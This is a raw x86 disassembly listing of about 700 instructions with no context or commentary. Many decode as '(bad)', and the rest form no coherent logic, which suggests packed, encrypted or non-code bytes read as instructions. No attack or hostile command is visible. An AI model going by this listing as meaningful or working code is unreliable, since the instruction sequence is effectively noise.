  4050da:	ins    BYTE PTR es:[edi],dx
  4050db:	xchg   ebx,eax
  4050dc:	xchg   edx,eax
  4050dd:	(bad)  
  4050de:	fst    DWORD PTR [ecx-0xe178ae4]
  4050e4:	pop    eax
  4050e5:	add    BYTE PTR [esi-0x205b3f8e],dl
  4050eb:	push   ds
  4050ec:	retf   0x289b
  4050ef:	push   esp
  4050f0:	push   0x89f648d8
  4050f5:	rcl    BYTE PTR [ebp+0x57],cl
  4050f8:	add    BYTE PTR [esi],dh
  4050fa:	mov    dl,0xad
  4050fc:	(bad)  
  4050fd:	pop    esi
  4050fe:	push   0x30466b0
  405103:	push   esi
  405104:	xlat   BYTE PTR ds:[ebx]
  405105:	mov    DWORD PTR [esi],ecx
  405107:	pop    ecx
  405108:	imul   edi,esp,0x1d
  40510b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40510c:	cli    
  40510d:	fist   WORD PTR [ebx]
  40510f:	inc    esp
  405110:	loope  0x405180
  405112:	or     ah,0x9d
  405115:	cld    
  405116:	mov    ebx,0x36424629
  40511b:	adc    DWORD PTR [eax+0x4a],esp
  40511e:	fisttp WORD PTR cs:[ebx]
  405121:	mov    ch,0xd
  405123:	mov    ds:0xdc5d1034,al
  405128:	xor    ecx,DWORD PTR [edi+eax*4-0x49]
  40512c:	dec    esi
  40512d:	sbb    ebp,DWORD PTR [esi-0xc418150]
  405133:	adc    BYTE PTR [ebx],0xe4
  405136:	sub    eax,0xe0af6cb1
  40513b:	push   ebx
  40513c:	inc    esp
  40513d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40513e:	mov    ds,edx
  405140:	xlat   BYTE PTR ds:[ebx]
  405141:	pop    ss
  405142:	mov    eax,ds:0xbc64dcad
  405147:	les    esp,FWORD PTR [ebx]
  405149:	jg     0x405169
  40514b:	cmp    DWORD PTR [esi],edi
  40514d:	shl    ch,cl
  40514f:	mov    esi,0x85b975ee
  405154:	out    dx,eax
  405155:	xor    eax,0xa5597ff0
  40515a:	jl     0x405175
  40515c:	int    0xcc
  40515e:	ss das 
  405160:	push   ecx
  405161:	icebp  
  405162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405163:	add    eax,0x76ccda4f
  405168:	outs   dx,DWORD PTR ds:[esi]
  405169:	jle    0x40514f
  40516b:	pushf  
  40516c:	jnp    0x4050fe
  40516e:	rol    DWORD PTR [ebp-0x635a3a08],0x81
  405175:	pop    es
  405176:	sub    esp,DWORD PTR [ebp+eiz*4-0x7f]
  40517a:	enter  0x51e3,0xeb
  40517e:	pop    ebx
  40517f:	dec    ebx
  405180:	ds jo  0x4051e3
  405183:	sbb    dl,ch
  405185:	push   ebx
  405186:	adc    ch,BYTE PTR [ebx+0x46]
  405189:	or     eax,0xc3a55981
  40518e:	mov    eax,0x7ffb55ae
  405193:	cs jl  0x4051c0
  405196:	fcomp  DWORD PTR [edi]
  405198:	mov    edi,0x57f4ccff
  40519d:	ss jmp 0x51:0x7087c4b1
  4051a5:	sbb    al,0x8f
  4051a7:	sub    eax,0xc2a9af43
  4051ac:	push   esi
  4051ad:	xchg   esi,eax
  4051ae:	add    cl,BYTE PTR [ebx+0x50]
  4051b1:	aam    0xa2
  4051b3:	inc    esi
  4051b4:	jno    0x405192
  4051b6:	ret    0x7468
  4051b9:	pop    ecx
  4051ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051bb:	xchg   esp,eax
  4051bc:	add    cl,BYTE PTR [edi+0x0]
  4051bf:	cmp    edx,DWORD PTR [edx]
  4051c1:	cdq    
  4051c2:	ret    0xb576
  4051c5:	inc    edx
  4051c6:	adc    dl,dl
  4051c8:	fwait
  4051c9:	test   eax,0xf8ca93af
  4051ce:	inc    eax
  4051cf:	dec    eax
  4051d0:	push   edi
  4051d1:	xchg   BYTE PTR [edx],ch
  4051d3:	test   eax,0x675f593e
  4051d8:	out    dx,eax
  4051d9:	fsub   QWORD PTR [esi-0x34]
  4051dc:	shl    DWORD PTR [ecx],1
  4051de:	in     eax,0xd4
  4051e0:	push   ebp
  4051e1:	mov    edi,0x43bda9c3
  4051e6:	pop    ss
  4051e7:	mov    al,bh
  4051e9:	scas   eax,DWORD PTR es:[edi]
  4051ea:	pop    ebx
  4051eb:	scas   al,BYTE PTR es:[edi]
  4051ec:	inc    ebp
  4051ed:	mov    dh,0xc5
  4051ef:	xchg   BYTE PTR ds:0x986c7a23,ah
  4051f5:	int    0xf5
  4051f7:	fwait
  4051f8:	(bad)  
  4051f9:	aas    
  4051fa:	dec    ebx
  4051fb:	xchg   BYTE PTR [ebx],al
  4051fd:	mov    dh,0x4a
  4051ff:	mov    ah,0x10
  405201:	add    ecx,DWORD PTR [esi-0x63]
  405204:	ins    BYTE PTR es:[edi],dx
  405205:	push   ecx
  405206:	inc    ebx
  405207:	packssdw mm2,QWORD PTR [ebx]
  40520a:	lods   al,BYTE PTR ds:[esi]
  40520b:	aaa    
  40520c:	mov    DWORD PTR [edx+0xd],edi
  40520f:	leave  
  405210:	outs   dx,DWORD PTR ds:[esi]
  405211:	dec    esi
  405212:	cli    
  405213:	repz cmp ebx,edi
  405216:	iret   
  405217:	clc    
  405218:	sub    eax,DWORD PTR [esi-0x1c]
  40521b:	xchg   esp,eax
  40521c:	xchg   ebx,eax
  40521d:	ins    DWORD PTR es:[edi],dx
  40521e:	mov    ds:0x20f1d6c1,eax
  405223:	cmp    eax,0x1f8da5c3
  405228:	mov    DWORD PTR [ebx-0x3b],ecx
  40522b:	dec    ebp
  40522c:	dec    ecx
  40522d:	jecxz  0x405203
  40522f:	pop    ss
  405230:	jo     0x4051b5
  405232:	outs   dx,DWORD PTR ds:[esi]
  405233:	dec    esp
  405234:	fdiv   DWORD PTR [esp+ebp*8+0x2e]
  405238:	dec    ebp
  405239:	out    dx,eax
  40523a:	inc    esi
  40523b:	xchg   esi,eax
  40523c:	or     eax,0x843d616b
  405241:	icebp  
  405242:	or     DWORD PTR [eax+0x3fbdaf1e],ebx
  405248:	outs   dx,BYTE PTR ds:[esi]
  405249:	cdq    
  40524a:	(bad)  
  40524b:	mov    WORD PTR [edi+ebx*2+0x26],es
  40524f:	xchg   ebp,eax
  405250:	or     al,0x4f
  405252:	faddp  st(0),st
  405254:	arpl   WORD PTR [eax+ebx*1+0x5f],si
  405258:	test   ebp,0xed518ca4
  40525e:	pop    esp
  40525f:	popa   
  405260:	stos   DWORD PTR es:[edi],eax
  405261:	popa   
  405262:	jmp    0x4052d8
  405264:	pop    esi
  405265:	lahf   
  405266:	mov    eax,ds:0x7dbd0c33
  40526b:	sar    BYTE PTR [esi-0x4d],0xf9
  40526f:	add    DWORD PTR [esi-0x4eb17d74],ecx
  405275:	pop    ecx
  405276:	add    eax,0xc9879116
  40527b:	ja     0x405216
  40527d:	(bad)  [edi+0x58]
  405280:	test   al,cl
  405282:	adc    edi,DWORD PTR [eax+ebp*2-0x1a]
  405286:	xchg   DWORD PTR [ebx+ecx*1-0x25],eax
  40528a:	loop   0x40521d
  40528c:	frstor [eax+0x2fc90492]
  405292:	push   edi
  405293:	gs aas 
  405295:	xchg   esi,eax
  405296:	jmp    0xdcc5:0x8d7b3299
  40529d:	vminps xmm6,xmm1,XMMWORD PTR ds:0x29b35c7f
  4052a5:	add    ah,bl
  4052a7:	mov    ah,BYTE PTR [edx-0x6279e232]
  4052ad:	test   al,0xbe
  4052af:	test   al,0x5
  4052b1:	data16 mul BYTE PTR [ecx]
  4052b4:	or     DWORD PTR [edi],edi
  4052b6:	jno    0x40525e
  4052b8:	cmp    DWORD PTR [ebx-0x2c],ebx
  4052bb:	push   ds
  4052bc:	mov    ecx,0x3978757b
  4052c1:	cdq    
  4052c2:	inc    ecx
  4052c3:	push   ds
  4052c4:	outs   dx,DWORD PTR ds:[esi]
  4052c5:	mov    eax,ds:0x3f68db10
  4052ca:	mov    al,0x61
  4052cc:	or     al,dh
  4052ce:	pushf  
  4052cf:	mov    eax,DWORD PTR ds:[edi]
  4052d2:	popf   
  4052d3:	popa   
  4052d4:	fcmove st,st(2)
  4052d6:	pop    edx
  4052d7:	ins    DWORD PTR es:[edi],dx
  4052d8:	loopne 0x405281
  4052da:	aas    
  4052db:	and    DWORD PTR [eax-0x4e],0x67
  4052df:	xchg   ebp,eax
  4052e0:	sbb    cl,ah
  4052e2:	mov    dl,0xb
  4052e4:	xchg   ebx,eax
  4052e5:	popa   
  4052e6:	mov    eax,0xac46997e
  4052eb:	adc    BYTE PTR [edi],bh
  4052ed:	aas    
  4052ee:	cmp    cl,bl
  4052f0:	pop    esp
  4052f1:	ins    DWORD PTR es:[edi],dx
  4052f2:	rol    BYTE PTR [edi-0x2fb3027c],0x28
  4052f9:	mov    ah,0xdc
  4052fb:	cmp    eax,0x5b4d9daf
  405300:	sahf   
  405301:	xchg   BYTE PTR [edx-0x19],ch
  405304:	xchg   ebp,eax
  405305:	mov    ebx,0x9b0beeb1
  40530a:	push   edx
  40530b:	add    dl,BYTE PTR ds:0x70bb5517
  405311:	ss popa 
  405313:	jne    0x4052e4
  405315:	push   ebp
  405316:	mov    edi,0x8682fd10
  40531b:	xchg   di,ax
  40531d:	mov    es,WORD PTR [ebx+0x9]
  405320:	fst    DWORD PTR ds:0xaf4cf7f3
  405326:	jnp    0x4052d0
  405328:	lods   eax,DWORD PTR ds:[esi]
  405329:	pop    eax
  40532a:	xchg   ecx,eax
  40532b:	das    
  40532c:	int    0x51
  40532e:	or     DWORD PTR [ebx+0x7d219769],ebx
  405334:	test   BYTE PTR [ebp-0x3bd09b8],ch
  40533a:	repz mov ebp,0x44458d0e
  405340:	gs push cx
  405343:	ret    0x6d90
  405346:	adc    al,0xd7
  405348:	test   DWORD PTR [esi],eax
  40534a:	arpl   WORD PTR [ebx-0x7a],cx
  40534d:	push   0x53
  40534f:	push   ds
  405350:	push   0x3f
  405352:	retf   
  405353:	imul   esp,DWORD PTR [eax],0x6a
  405356:	xor    ebp,DWORD PTR [ebp+0x66ccd90]
  40535c:	xor    eax,DWORD PTR [eax]
  40535e:	(bad)  
  40535f:	xchg   edx,eax
  405360:	(bad)  
  405361:	popf   
  405362:	not    DWORD PTR [ebx]
  405364:	xor    DWORD PTR [edi-0x80],eax
  405367:	lods   al,BYTE PTR ds:[esi]
  405368:	add    eax,0x8d7ac3b3
  40536d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40536e:	jecxz  0x4053e9
  405370:	pop    ebp
  405371:	pop    esi
  405372:	pop    ss
  405373:	add    al,0x11
  405375:	in     al,0xcf
  405377:	sbb    al,0xbc
  405379:	repz fist DWORD PTR [eax+edi*1+0x5343a39c]
  405381:	push   cs
  405382:	mov    bh,BYTE PTR [eax+esi*4]
  405385:	push   0x3047e62a
  40538a:	mov    gs,esi
  40538c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40538d:	stos   BYTE PTR es:[edi],al
  40538e:	ret    
  40538f:	pop    ss
  405390:	add    cl,BYTE PTR [esi-0x6a]
  405393:	loope  0x40531a
  405395:	test   BYTE PTR [eax+0x124e595d],al
  40539b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40539c:	jmp    0x5f32:0x3f18f30f
  4053a3:	push   ds
  4053a4:	bound  edi,QWORD PTR [edx]
  4053a6:	aaa    
  4053a7:	pusha  
  4053a8:	std    
  4053a9:	jp     0x405353
  4053ab:	jle    0x405418
  4053ad:	icebp  
  4053ae:	call   0x35672e2b
  4053b3:	push   ss
  4053b4:	mov    eax,0xc23da958
  4053b9:	push   es
  4053ba:	add    ebp,DWORD PTR [edi-0x12]
  4053bd:	bound  eax,QWORD PTR [ebx]
  4053bf:	call   0x35be:0x53431176
  4053c6:	(bad)  [esi+0x104ae4d9]
  4053cc:	in     al,dx
  4053cd:	dec    edx
  4053ce:	repnz dec edi
  4053d0:	xor    edx,esi
  4053d2:	(bad)  
  4053d3:	test   al,0x99
  4053d5:	xchg   esi,eax
  4053d6:	jnp    0x405456
  4053d8:	add    DWORD PTR [ebx+edi*8+0x74],edi
  4053dc:	fcomp  st(6)
  4053de:	and    eax,0xdc128c00
  4053e3:	sbb    bl,cl
  4053e5:	fdiv   DWORD PTR [edi+0x4ad27e65]
  4053eb:	lds    eax,FWORD PTR [ecx]
  4053ed:	inc    esi
  4053ee:	dec    BYTE PTR [ebx+0x75]
  4053f1:	lods   eax,DWORD PTR ds:[esi]
  4053f2:	(bad)  
  4053f3:	jnp    0x405422
  4053f5:	rcl    BYTE PTR [ebp+ecx*4-0xda24efd],1
  4053fc:	test   al,0xc8
  4053fe:	iret   
  4053ff:	sub    esi,edi
  405401:	mov    esp,DWORD PTR [ebx]
  405403:	push   eax
  405404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405405:	sbb    al,BYTE PTR [esi+0x6a]
  405408:	sbb    bl,BYTE PTR [esi-0x73]
  40540b:	scas   eax,DWORD PTR es:[edi]
  40540c:	pop    eax
  40540d:	xlat   BYTE PTR ds:[ebx]
  40540e:	psubb  mm2,QWORD PTR fs:[edi-0x79]
  405413:	gs xchg ecx,eax
  405415:	sub    esi,DWORD PTR [edx+0x742de482]
  40541b:	sbb    ebx,edx
  40541d:	mov    bl,BYTE PTR gs:[esi+0x79585adc]
  405424:	mov    BYTE PTR [ebp+0x2d],bl
  405427:	xchg   ecx,eax
  405428:	loope  0x40544c
  40542a:	xor    al,0x8
  40542c:	adc    BYTE PTR [eax],al
  40542e:	adc    eax,0xc286b12d
  405433:	pop    ecx
  405434:	loope  0x40541e
  405436:	fld    DWORD PTR [ebx-0x51]
  405439:	stos   BYTE PTR es:[edi],al
  40543a:	sbb    ah,ch
  40543c:	pop    ss
  40543d:	dec    eax
  40543e:	push   eax
  40543f:	cwde   
  405440:	ss retf 
  405442:	jg     0x405441
  405444:	inc    edx
  405445:	(bad)  
  405446:	xchg   ebx,eax
  405447:	int    0x94
  405449:	sub    al,0xae
  40544b:	sbb    eax,eax
  40544d:	and    BYTE PTR [edi+0x49],al
  405450:	pop    ds
  405451:	push   eax
  405452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405453:	sbb    al,0x56
  405455:	push   cs
  405456:	mov    edi,0x7720bc35
  40545b:	mov    cx,0x7659
  40545f:	jmp    FWORD PTR [esi]
  405461:	sbb    esi,DWORD PTR [edi-0x54]
  405464:	push   edx
  405465:	push   cs
  405466:	ret    0x5f89
  405469:	dec    edi
  40546a:	ficom  WORD PTR [edx]
  40546c:	pusha  
  40546d:	cmp    eax,0x5f666cf7
  405472:	jns    0x4054c0
  405474:	mov    dh,0x8d
  405476:	inc    esp
  405477:	xchg   edx,eax
  405478:	push   eax
  405479:	push   0x13
  40547b:	adc    DWORD PTR [edx-0x402245e7],eax
  405481:	sbb    esp,eax
  405483:	or     eax,0x88b9d5b6
  405488:	dec    ecx
  405489:	xor    al,0xaf
  40548b:	xor    DWORD PTR [edi],0xffffff81
  40548e:	xchg   edi,eax
  40548f:	sub    BYTE PTR ds:0x5cab8a6b,bl
  405495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405496:	scas   eax,DWORD PTR es:[edi]
  405497:	imul   edx,esp,0xc
  40549a:	sti    
  40549b:	push   cs
  40549c:	rcr    DWORD PTR [ebp+0x62],0x8e
  4054a0:	xchg   edx,eax
  4054a1:	inc    ecx
  4054a2:	clc    
  4054a3:	mov    edx,0x530a68da
  4054a8:	sbb    BYTE PTR [edx-0x347deee5],al
  4054ae:	in     eax,0x55
  4054b0:	inc    edx
  4054b1:	pop    edx
  4054b2:	push   cs
  4054b3:	das    
  4054b4:	aad    0x57
  4054b6:	xchg   DWORD PTR [edi+0x43ab185f],ecx
  4054bc:	sbb    eax,0xd2fd2e74
  4054c1:	dec    ecx
  4054c2:	je     0x4054fb
  4054c4:	pop    edi
  4054c5:	call   0x40ef:0xa0210704
  4054cc:	push   0x26
  4054ce:	scas   al,BYTE PTR es:[edi]
  4054cf:	shr    BYTE PTR [ecx-0x67654c39],1
  4054d5:	pushf  
  4054d6:	enter  0x14e,0xdf
  4054da:	xchg   DWORD PTR [ecx],ecx
  4054dc:	and    al,0x38
  4054de:	test   DWORD PTR [ebx+0x59],ebx
  4054e1:	jmp    0xd471e25f
  4054e6:	xor    eax,0xf83a9758
  4054eb:	ret    0x20ab
  4054ee:	(bad)  
  4054ef:	adc    eax,DWORD PTR [esi+0x21d1fb36]
  4054f5:	pop    eax
  4054f6:	inc    esi
  4054f7:	dec    ebx
  4054f8:	rol    bh,0x68
  4054fb:	popf   
  4054fc:	frstor [ebx+0x4e73573c]
  405502:	sub    bl,BYTE PTR [ecx+0x13a0eafb]
  405508:	cmp    edx,DWORD PTR [eax-0x6bd3d05f]
  40550e:	xchg   esi,eax
  40550f:	pop    edx
  405510:	out    dx,al
  405511:	jle    0x4054e8
  405513:	jne    0xd892f88d
  405519:	addr16 push edx
  40551b:	xor    edx,ebp
  40551d:	sub    DWORD PTR [edi],ebx
  40551f:	test   BYTE PTR [esi+eax*8+0x61771f51],ch
  405526:	add    dh,BYTE PTR [edx]
  405528:	push   DWORD PTR [eax]
  40552a:	push   edi
  40552b:	call   0x67a5:0x39d174e2
  405532:	imul   edx,DWORD PTR [ebp+0x7246d199],0xffffffc0
  405539:	push   0xffffffbc
  40553b:	xchg   ebp,eax
  40553c:	sar    ah,cl
  40553e:	(bad)  [edi+ebp*2-0x128b90f3]
  405545:	int3   
  405546:	and    eax,0x5a6df45b
  40554b:	fisttp QWORD PTR [ebx+0x39]
  40554e:	and    eax,0x884e81f3
  405553:	fs inc eax
  405555:	sbb    al,0x9b
  405557:	mov    bl,0x59
  405559:	sbb    esi,DWORD PTR [ebx-0x7794075e]
  40555f:	stc    
  405560:	dec    ebx
  405561:	mov    edx,0xbec6b44c
  405566:	jno    0x405525
  405568:	jae    0x405520
  40556a:	jbe    0x40559e
  40556c:	mov    dl,0xd8
  40556e:	std    
  40556f:	and    BYTE PTR [eax],0x57
  405572:	inc    eax
  405573:	push   0x51a3f497
  405578:	stos   DWORD PTR es:[edi],eax
  405579:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40557a:	retf   0x6bad
  40557d:	mov    al,ds:0xa3b5ec68
  405582:	add    ch,BYTE PTR [eax-0x5227d0b5]
  405588:	sub    BYTE PTR [edx+0x66],cl
  40558b:	dec    ecx
  40558c:	sahf   
  40558d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40558e:	sbb    eax,0xfb4c73b2
  405593:	es addr16 adc eax,0xca6b3e2e
  40559a:	pop    eax
  40559b:	cmp    DWORD PTR [ecx+0x6e],edi
  40559e:	jecxz  0x40556b
  4055a0:	push   eax
  4055a1:	iret   
  4055a2:	mov    ch,0xfe
  4055a4:	in     al,dx
  4055a5:	jne    0x4055d3
  4055a7:	inc    ecx
  4055a8:	aaa    
  4055a9:	in     al,0xa3
  4055ab:	fild   DWORD PTR [ebp+ecx*1+0x19f7307e]
  4055b2:	sbb    DWORD PTR [edx-0x1a8e5b9c],0x88b7e3ec
  4055bc:	cs dec edi
  4055be:	ins    DWORD PTR es:[edi],dx
  4055bf:	mov    ds:0x679a0d07,al
  4055c4:	mov    edx,0x7710424d
  4055c9:	mov    ah,0x3d
  4055cb:	add    al,ch
  4055cd:	ins    DWORD PTR es:[edi],dx
  4055ce:	push   ecx
  4055cf:	scas   al,BYTE PTR es:[edi]
  4055d0:	xchg   esi,eax
  4055d1:	lea    ecx,[ebp-0x19fca529]
  4055d7:	push   es
  4055d8:	adc    BYTE PTR [ebp+0x47],dh
  4055db:	(bad)  
  4055dc:	aaa    
  4055dd:	(bad)  
  4055de:	ret    
  4055df:	adc    BYTE PTR [edi-0x3e9199a0],bh
  4055e5:	int    0x76
  4055e7:	sub    DWORD PTR [eax+0x2998b8a1],ecx
  4055ed:	xor    al,0x61
  4055ef:	gs fdivp st(1),st
  4055f2:	xchg   ebp,ebp
  4055f4:	je     0x405669
  4055f6:	sbb    BYTE PTR [edx+0x7e],bh
  4055f9:	and    al,0x96
  4055fb:	fnstenv [ebx+0xa]
  4055fe:	xchg   esi,eax
  4055ff:	hlt    
  405600:	xlat   BYTE PTR ds:[ebx]
  405601:	test   BYTE PTR ss:[ebp+0x1f33ffe8],0x8b
  405609:	push   esi
  40560a:	xor    bh,BYTE PTR [ebx]
  40560c:	imul   edx,DWORD PTR [ebp+0x75],0xffffffab
  405610:	add    al,0xd3
  405612:	add    edx,ebx
  405614:	xor    DWORD PTR [ecx-0x18],edi
  405617:	inc    edx
  405618:	sti    
  405619:	mov    ds:0x55568f22,eax
  40561e:	mov    al,ds:0x42c2c708
  405623:	lods   eax,DWORD PTR ds:[esi]
  405624:	or     edi,DWORD PTR [ebx-0x639f8388]
  40562a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40562b:	sbb    DWORD PTR [ecx+ebx*8],eax
  40562e:	bnd je 0x405693
  405631:	shl    BYTE PTR [edx],1
  405633:	clc    
  405634:	in     eax,dx
  405635:	push   eax
  405636:	daa    
  405637:	outs   dx,DWORD PTR ds:[esi]
  405638:	xchg   ecx,eax
  405639:	jmp    0x405680
  40563b:	push   0x34
  40563d:	jnp    0x405604
  40563f:	(bad)  
  405640:	retf   
  405641:	sbb    DWORD PTR [ecx+0x3abbc984],esi
  405647:	sub    dh,BYTE PTR [esi+0x51901b9b]
  40564d:	nop
  40564e:	and    ebp,DWORD PTR [ebx]
  405650:	or     eax,0x657adc72
  405655:	fdiv   QWORD PTR [ebx]
  405657:	mov    ds:0x774d9fe2,al
  40565c:	adc    cl,BYTE PTR [edi+edi*4-0x747871bd]
  405663:	mov    ds:0x8d0f76b5,eax
  405668:	mov    BYTE PTR [edi+0x6d],bh
  40566b:	push   ds
  40566c:	xchg   esi,eax
  40566d:	test   eax,0xbdcebe81
  405672:	mov    eax,0x777c4073
  405677:	out    dx,al
  405678:	sub    eax,0x695a2a47
  40567d:	aaa    
  40567e:	outs   dx,DWORD PTR ds:[esi]
  40567f:	inc    edx
  405680:	shl    BYTE PTR [eax+edi*4-0x66],1
  405684:	jno    0x405702
  405686:	inc    esi
  405687:	add    BYTE PTR [eax],ah
  405689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40568a:	data16 daa 
  40568c:	sbb    BYTE PTR [esi+0x46],ah
  40568f:	xor    BYTE PTR [edx+0x17e37ef6],cl
  405695:	imul   edi,eax,0xffffffdc
  405698:	dec    esp
  405699:	sti    
  40569a:	inc    edi
  40569b:	jb     0x405642
  40569d:	adc    DWORD PTR [ebx-0x61],0x5c
  4056a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056a2:	pop    ebp
  4056a3:	daa    
  4056a4:	fld    QWORD PTR [ebx]
  4056a6:	push   cs
  4056a7:	cmc    
  4056a8:	inc    edx
  4056a9:	cmp    BYTE PTR [esi],0xb9
  4056ac:	mov    ch,0x62
  4056ae:	cmp    BYTE PTR [ebx],0x43
  4056b1:	sbb    DWORD PTR [ecx],esi
  4056b3:	lea    ebx,[esi-0x79]
  4056b6:	dec    eax
  4056b7:	mov    ebx,0xd222ed8b
  4056bc:	loopne 0x405655
  4056be:	(bad)  
  4056bf:	lock mov ds:0x940c88d7,eax
  4056c5:	scas   eax,DWORD PTR es:[edi]
  4056c6:	or     al,0xe9
  4056c8:	cli    
  4056c9:	cmp    eax,0x9cb7587a
  4056ce:	adc    esi,ebp
  4056d0:	mov    ds:0xb231c8a,al
  4056d5:	test   eax,0xa6cbc64
  4056da:	fwait
  4056db:	ins    BYTE PTR es:[edi],dx
  4056dc:	fcmovne st,st(6)
  4056de:	push   esp
  4056df:	push   es
  4056e0:	pop    eax
  4056e1:	mov    ecx,DWORD PTR [edx-0x66]
  4056e4:	test   DWORD PTR [edi-0xae80183],0x301824c
  4056ee:	retf   
  4056ef:	les    edx,FWORD PTR [ecx]
  4056f1:	jbe    0x405772
  4056f3:	mov    eax,0x3a5089a2
  4056f8:	adc    al,0x15
  4056fa:	sub    BYTE PTR [esi+0x16],bh
  4056fd:	out    0xb5,al
  4056ff:	pop    ds
  405700:	stos   BYTE PTR es:[edi],al
  405701:	push   ebx
  405702:	add    eax,0x379a6942
  405707:	imul   eax,DWORD PTR [ebx+eax*8-0x9],0xd5dfdac3
  40570f:	call   0x833bf30d
  405714:	sub    ecx,ebp
  405716:	add    al,0x37
  405718:	aaa    
  405719:	dec    ecx
  40571a:	jle    0x405740
  40571c:	xor    al,0xfa
  40571e:	mov    ebx,0xd9f35762
  405723:	out    dx,eax
  405724:	mov    BYTE PTR [edx+0x22a88658],0xdc
  40572b:	std    
  40572c:	in     al,dx
  40572d:	xor    al,0x7
  40572f:	or     BYTE PTR [ecx+0x79255468],bh
  405735:	into   
  405736:	iret   
  405737:	or     DWORD PTR [ecx+0x4],0xffffffda
  40573b:	and    bl,ch
  40573d:	jo     0x40575d
  40573f:	mov    ebp,0x96d5527b
  405744:	sbb    al,0x76
  405746:	and    eax,DWORD PTR [eax+0x75]
  405749:	pop    es
  40574a:	cmp    bh,BYTE PTR ds:0x1aa1730d
  405750:	jl     0x4056f9
  405752:	mov    bl,0x46
  405754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405755:	fist   DWORD PTR [edx-0x4796d8bf]
  40575b:	mov    DWORD PTR [edx-0x26],esi
  40575e:	out    dx,al
  40575f:	mov    esp,0xff5f1933
  405764:	push   cs
  405765:	imul   edx,esi,0x31
  405768:	mov    bx,ss
  40576b:	int    0x1
  40576d:	adc    eax,DWORD PTR [edx]
  40576f:	cmp    al,0xc1
  405771:	dec    esp
  405772:	in     eax,dx
  405773:	jmp    0x4057be
  405775:	(bad)  
  405776:	and    ecx,DWORD PTR [esi+0xe1bd542]
  40577c:	jo     0x405767
  40577e:	stos   DWORD PTR es:[edi],eax
  40577f:	mov    ch,0xa8
  405781:	adc    al,0x9a
  405783:	xor    ecx,DWORD PTR [eax-0x32fd9dff]
  405789:	inc    esi
  40578a:	jnp    0x4057bd
  40578c:	call   0x2497a6c1
  405791:	xchg   edi,eax
  405792:	sbb    DWORD PTR [ebp-0x14],ebx
  405795:	mov    al,BYTE PTR [ecx-0x1d]
  405798:	sbb    al,BYTE PTR [ebx+edi*1+0x4]
  40579c:	(bad)
  40579f:	pop    esp
  4057a0:	inc    ecx
  4057a1:	js     0x4057ce
  4057a3:	adc    DWORD PTR [ebp+0x28e8c2e7],0x72
  4057aa:	sbb    BYTE PTR [ebp-0x2557c371],bh
  4057b0:	mov    ds:0xa79762b7,eax
  4057b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057b6:	xchg   ecx,eax
  4057b7:	lahf   
  4057b8:	ret    
  4057b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057ba:	fisub  WORD PTR fs:[eax]
  4057bd:	pop    ebp
  4057be:	or     bh,BYTE PTR [esi+0x79d8dd76]
  4057c4:	ja     0x40582f
  4057c6:	xor    esp,DWORD PTR [edi-0x11]
  4057c9:	sub    cl,BYTE PTR [ecx]
  4057cb:	leave  
  4057cc:	cmc    
  4057cd:	xchg   edi,eax
  4057ce:	jle    0x4057c3
  4057d0:	inc    ebp
  4057d1:	dec    ebp
  4057d2:	(bad)  
  4057d3:	in     eax,dx
  4057d4:	sbb    al,0x15
  4057d6:	or     eax,0x8ffde202
  4057db:	xchg   DWORD PTR [edx-0x2906ae5a],eax
  4057e1:	fcmovbe st,st(3)
  4057e3:	cmp    edx,DWORD PTR [edx-0x60]
  4057e6:	sub    DWORD PTR [ebx],ebx
  4057e8:	add    al,0xb3
  4057ea:	mov    eax,0xc3ddba81
  4057ef:	and    eax,0xd8c3d213
  4057f4:	xchg   esi,eax
  4057f5:	jp     0x40580a
  4057f7:	xor    esi,edx
  4057f9:	xor    DWORD PTR [esi+0x1c],ebp
  4057fc:	jecxz  0x405874
  4057fe:	lods   al,BYTE PTR ds:[esi]
  4057ff:	rol    BYTE PTR [ebp+0x41e46948],1
  405805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405806:	in     eax,0xa0
  405808:	fcomi  st,st(0)
  40580a:	aad    0xdb
  40580c:	xor    DWORD PTR [edi+0x1f],edi
  40580f:	ror    DWORD PTR [eax-0x376c0a96],0x4a
  405816:	inc    esp
  405817:	jmp    0x3f34:0x8dbe699a
  40581e:	cmc    
  40581f:	nop
  405820:	addr16 mov ds:0xaf80,eax
  405824:	test   BYTE PTR [eax],dl
  405826:	(bad)  
  405827:	ds es (bad) 
  40582a:	jg     0x4057ea
  40582c:	jp     0x40580a
  40582e:	mov    cl,0x68
  405831:	popa   
  405832:	jmp    0x1381:0xe8f0aab1
  405839:	inc    esp
  40583a:	in     eax,0x7a
  40583c:	and    eax,0x209b54a8
  405841:	add    eax,0x6536ef56
  405846:	test   DWORD PTR [esi*4+0x72c3760b],esi
  40584d:	sub    eax,0x93a3a6d6
  405852:	repnz mov ds:0x3312044e,eax
  405858:	xchg   edx,eax
  405859:	pop    esi
  40585a:	cwde   
  40585b:	jns    0x405808
  40585d:	gs into 
  40585f:	push   esi
  405860:	push   ss
  405861:	ret    
  405862:	dec    ebp
  405863:	(bad)  
  405864:	in     al,0x29
  405866:	nop
  405867:	xor    eax,0x4ec9a718
  40586c:	push   edx
  40586d:	mov    edx,DWORD PTR [ebp+0x3c996ce8]
  405873:	add    dl,ah
  405875:	mov    ebp,0x17d74877
  40587a:	pop    ss
  40587b:	mov    ah,BYTE PTR [edi-0x2c]
  40587e:	sub    eax,ebp
  405880:	ss (bad) 
  405882:	sti    
  405883:	jmp    0x2a89:0xc917ebf6
  40588a:	adc    al,0x96
  40588c:	mov    edx,0x1fc8d224
